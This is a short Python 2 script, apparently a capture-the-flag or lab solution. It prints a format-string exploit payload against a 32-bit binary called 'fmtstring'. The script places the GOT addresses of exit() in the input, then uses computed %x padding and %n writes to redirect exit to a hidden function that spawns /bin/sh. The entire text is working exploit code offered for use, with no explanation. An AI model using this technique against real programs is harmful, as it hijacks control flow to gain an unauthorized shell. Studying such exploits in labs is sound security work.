#!/usr/bin/python

# Will utilize a secret method (ez_string()) to spawn /bin/sh

#fmtstring:     file format elf32-i386

#DYNAMIC RELOCATION RECORDS
#OFFSET   TYPE              VALUE
# 0804b2c0 R_386_JUMP_SLOT   exit@GLIBC_2.0
w1 = '\xc0\xb2\x04\x08JUNK'
w2 = '\xc1\xb2\x04\x08JUNK'
w3 = '\xc2\xb2\x04\x08JUNK'
w4 = '\xc3\xb2\x04\x08JUNK'

b1 = 0xa2
b2 = 0x91
b3 = 0x04
b4 = 0x08

n1 = 256 + b1 - 0x2f - 1
n2 = 256*2 + b2 - n1 - 0x2f - 1
n3 = 256*3 + b3 - n1 - n2 - 0x2f - 1
n4 = 256*4 + b4 - n1 - n2 - n3 - 0x2f - 1

form = '%x%x%' + str(n1) + 'x%n%' + str(n2)
form += 'x%n%' + str(n3) + 'x%n%' + str(n4) + 'x%n'

print w1 + w2 + w3 + w4 + form
